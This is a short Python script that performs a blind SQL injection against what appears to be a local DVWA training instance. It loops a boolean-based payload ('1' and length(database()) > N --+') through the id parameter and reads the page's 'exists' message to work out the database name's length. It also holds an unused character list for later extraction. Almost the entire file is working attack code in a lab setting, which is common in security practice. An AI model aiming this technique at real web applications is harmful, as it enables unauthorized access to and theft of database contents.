import requests
import re

Cookies = {
    "security" : "low",
    "PHPSESSID" : "bisa3951gavdkuqom8o0gbi690"
}
exist = "User ID exists in the database"
not_exist = "User ID is MISSING from the database"


database_length = 0
payload_length = r"1' and length(database()) >= " + str(database_length) + " --+ "
url = "http://192.168.0.106/dvwa/vulnerabilities/sqli_blind/?id=" + payload_length + "&Submit=Submit"
response = requests.get(url, cookies=Cookies)
content = response.text

while re.search(exist, content, re.S):
    database_length += 1
    payload_length = r"1' and length(database()) > " + str(database_length) + " --+ "
    url = "http://192.168.0.106/dvwa/vulnerabilities/sqli_blind/?id=" + payload_length + "&Submit=Submit"
    response = requests.get(url, cookies=Cookies)
    content = response.text


list_database = [1, 2, 3, 4, 5, 6, 7, 8, 9, 0, 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                 'o','p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '_', '-', '&', '$']





print(database_length)

# if re.search(exist, content, re.S) is not None:
#     print(exist)
# elif re.search(not_exist, content, re.S) is not None:
#     print(not_exist)
# else:
#     print("error!")
